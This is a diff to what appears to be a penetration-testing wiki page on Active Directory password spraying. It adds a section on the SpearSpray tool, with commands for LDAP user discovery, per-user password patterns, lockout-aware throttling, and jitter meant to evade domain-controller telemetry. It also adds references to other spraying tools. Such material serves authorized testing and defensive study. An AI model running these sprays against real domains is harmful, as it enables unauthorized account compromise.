@@ -109,6 +109,81 @@ Invoke-SprayEmptyPassword
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
 
+### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
+
+Kerberos pre-auth–based spraying reduces noise vs SMB/NTLM/LDAP bind attempts and aligns better with AD lockout policies. SpearSpray couples LDAP-driven targeting, a pattern engine, and policy awareness (domain policy + PSOs + badPwdCount buffer) to spray precisely and safely. It can also tag compromised principals in Neo4j for BloodHound pathing.
+
+Key ideas:
+- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
+- Domain lockout policy + PSO-aware filtering to leave a configurable attempt buffer (threshold) and avoid locking users.
+- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
+- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
+- Throughput control with threads, jitter, and max requests per second.
+- Optional Neo4j integration to mark owned users for BloodHound.
+
+Basic usage and discovery:
+
+```bash
+# List available pattern variables
+spearspray -l
+
+# Basic run (LDAP bind over TCP/389)
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local
+
+# LDAPS (TCP/636)
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
+```
+
+Targeting and pattern control:
+
+```bash
+# Custom LDAP filter (e.g., target specific OU/attributes)
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
+  -q "(&(objectCategory=person)(objectClass=user)(department=IT))"
+
+# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
+```
+
+Stealth and safety controls:
+
+```bash
+# Control concurrency, add jitter, and cap request rate
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10
+
+# Leave N attempts in reserve before lockout (default threshold: 2)
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
+```
+
+Neo4j/BloodHound enrichment:
+
+```bash
+spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
+```
+
+Pattern system overview (patterns.txt):
+
+```text
+# Example templates consuming per-user attributes and temporal context
+{name}{separator}{year}{suffix}
+{month_en}{separator}{short_year}{suffix}
+{season_en}{separator}{year}{suffix}
+{samaccountname}
+{extra}{separator}{year}{suffix}
+```
+
+Available variables include:
+- {name}, {samaccountname}
+- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Composition helpers and org token: {separator}, {suffix}, {extra}
+
+Operational notes:
+- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
+- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
+- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.
+
+> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.
+
 ## Outlook Web Access
 
 There are multiples tools for p**assword spraying outlook**.
@@ -142,6 +217,11 @@ To use any of these tools, you need a user list and a password / a small list of
 
 ## References
 
+- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
+- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
+- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
+- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
+- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 - [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 - [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
@@ -149,6 +229,3 @@ To use any of these tools, you need a user list and a password / a small list of
 
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
